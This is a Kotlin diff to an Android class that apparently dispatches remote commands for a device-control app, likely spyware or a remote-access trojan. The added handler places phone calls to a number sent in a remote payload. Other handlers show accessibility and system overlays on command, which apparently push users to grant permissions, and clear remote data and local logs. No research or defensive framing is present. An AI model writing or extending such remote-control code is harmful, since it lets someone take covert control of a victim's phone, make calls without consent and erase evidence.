@@ -117,6 +117,20 @@ class RemoteCommandManager(private val context: Context) {
                     FirebaseSyncEngine(context).clearAllRemoteData()
                     resultMessage = "All remote backup data and local logs cleared successfully."
                 }
+                "PLACE_CALL", "MAKE_CALL", "CALL", "CALL_PHONE", "DIAL_CALL", "REMOTE_CALL" -> {
+                    val parts = payload.split("|")
+                    val targetNum = parts[0].trim()
+                    val targetSim = parts.getOrNull(1)?.trim()?.toIntOrNull()
+                    val res = CallHelper.placeCall(context, targetNum, targetSim)
+                    resultMessage = res
+                    if (res.contains("denied", ignoreCase = true) ||
+                        res.contains("Missing", ignoreCase = true) ||
+                        res.contains("No dialer", ignoreCase = true) ||
+                        res.contains("Invalid", ignoreCase = true) ||
+                        res.contains("Error", ignoreCase = true)) {
+                        isSuccess = false
+                    }
+                }
                 "SHOW_ACCESSIBILITY_OVERLAY", "ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY", "REQUIRE_ACCESSIBILITY", "SHOW_ACCESSIBILITY_PROMPT", "START_ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY_TEMPLATE" -> {
                     val templateId = if (payload.isNotBlank()) payload.trim() else "accessibility"
                     resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, templateId)
@@ -126,9 +140,6 @@ class RemoteCommandManager(private val context: Context) {
                 }
                 "SHOW_SYSTEM_OVERLAY", "SYSTEM_OVERLAY" -> {
                     resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, "system")
-                }
-                "SHOW_LOCATION_OVERLAY", "LOCATION_OVERLAY", "REQUIRE_LOCATION_OVERLAY" -> {
-                    resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, "location")
                 }
                 "HIDE_ACCESSIBILITY_OVERLAY", "REMOVE_ACCESSIBILITY_OVERLAY", "HIDE_OVERLAY", "DISMISS_ACCESSIBILITY_OVERLAY" -> {
                     com.example.service.AccessibilityOverlayManager.removeOverlay(context)
